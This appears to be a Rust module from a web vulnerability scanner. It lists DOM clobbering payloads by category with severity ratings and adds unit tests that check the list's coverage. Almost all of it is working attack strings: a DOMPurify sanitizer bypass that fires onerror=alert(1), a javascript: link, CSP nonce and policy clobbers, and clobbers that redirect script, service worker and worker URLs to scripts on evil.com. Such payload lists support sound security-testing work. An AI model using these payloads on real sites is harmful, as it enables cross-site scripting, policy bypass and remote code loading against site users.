use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    payload_vec!(PayloadType::DomClobber,
        "basic", [
            ("<form id=x><output id=y>I've been clobbered</output>", "Value clobbering", Severity::High),
            ("<a id=x><a id=x name=y href=\"Clobbered\">", "DOM collection clobbering", Severity::High),
            ("<form id=x name=y><input id=z></form>", "3-level deep clobbering", Severity::High),
            ("<html id=\"cdnDomain\">clobbered</html>", "Document.getElementById clobber", Severity::Medium),
            ("<svg><body id=cdnDomain>clobbered</body></svg>", "SVG body clobber", Severity::Medium),
            ("<a id=x href=\"ftp:Clobbered-username:Clobbered-Password@a\">", "Username/password clobbering", Severity::High),
        ];
        "iframe", [
            ("<iframe name=a srcdoc=\"<a id=c name=d href=cid:Clobbered>test</a><a id=c>\"></iframe>", "Nested iframe clobber", Severity::High),
            ("<iframe srcdoc=\"<form id=x><output id=y>Clobbered</output></form>\"></iframe>", "Iframe form clobber", Severity::Medium),
            ("<iframe srcdoc=\"<a id=x name=y href=//evil.com>Clobbered</a>\"></iframe>", "Iframe link clobber", Severity::High),
            ("<iframe name=b srcdoc=\"<a id=c name=d href=cid:evil>Clobbered</a>\"></iframe>", "Iframe nested name", Severity::High),
            ("<iframe srcdoc=\"<form id=token><input name=csrf value=stolen></form>\"></iframe>", "Token field clobber", Severity::High),
        ];
        "bypass", [
            ("<a id=defaultAvatar><a id=defaultAvatar name=avatar href=\"cid:&quot;onerror=alert(1)//\">", "DomPurify CID bypass", Severity::Critical),
            ("<base href=a:abc><a id=x href=\"Firefox<>\">", "Firefox-specific clobber", Severity::High),
            ("<base href=\"a://Clobbered<>\"><a id=x name=x><a id=x name=xz href=123>", "Chrome-specific clobber", Severity::High),
            ("<form id=x><input id=y name=z><input id=y></form>", "forEach clobber", Severity::High),
            ("<div id=\"x\"><a id=\"x\" name=\"y\" href=\"javascript:alert(1)\">click</a></div>", "Link clobber for XSS", Severity::Critical),
        ];
        "service-worker", [
            ("<a id=registration><a id=registration name=scope href=\"/\">", "Service worker scope clobber", Severity::High),
            ("<form id=config><input name=serviceWorker value=\"evil.js\"></form>", "SW config clobber", Severity::High),
            ("<iframe srcdoc=\"<a id=sw name=scriptURL href=http://evil.com/sw.js>\"></iframe>", "SW URL clobber", Severity::High),
            ("<a id=worker><a id=worker name=scriptURL href=http://evil.com/worker.js>", "Worker URL clobber", Severity::High),
        ];
        "csp-bypass", [
            ("<form id=nonce><input name=\"csp-nonce\" value=\"bypass\"></form>", "Nonce clobbering", Severity::High),
            ("<a id=script><a id=script name=src href=http://evil.com/evil.js>", "Script src clobber", Severity::Critical),
            ("<iframe name=domain srcdoc=\"<a id=csp name=report-uri href=http://evil.com/csp-violation>\"></iframe>", "CSP report-uri clobber", Severity::High),
            ("<meta id=content-security-policy content=\"default-src *\">", "CSP meta tag injection", Severity::Critical),
            ("<a id=policy><a id=policy name=content href=\"default-src 'unsafe-inline'\">", "CSP policy clobber", Severity::Critical),
        ]
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "DOM Clobber payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_dom_clobber_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::DomClobber);
        }
    }

    #[test]
    fn contains_basic_clobber() {
        let payloads = get_payloads();
        let has_basic = payloads
            .iter()
            .any(|p| p.tags.contains(&"basic".to_string()));
        assert!(has_basic, "Must contain basic clobber payloads");
    }

    #[test]
    fn contains_iframe_clobber() {
        let payloads = get_payloads();
        let has_iframe = payloads
            .iter()
            .any(|p| p.tags.contains(&"iframe".to_string()));
        assert!(has_iframe, "Must contain iframe clobber payloads");
    }

    #[test]
    fn contains_bypass_payloads() {
        let payloads = get_payloads();
        let has_bypass = payloads
            .iter()
            .any(|p| p.tags.contains(&"bypass".to_string()));
        assert!(has_bypass, "Must contain bypass payloads");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 15,
            "Must have substantial DOM Clobber payload coverage, got {}",
            payloads.len()
        );
    }
}
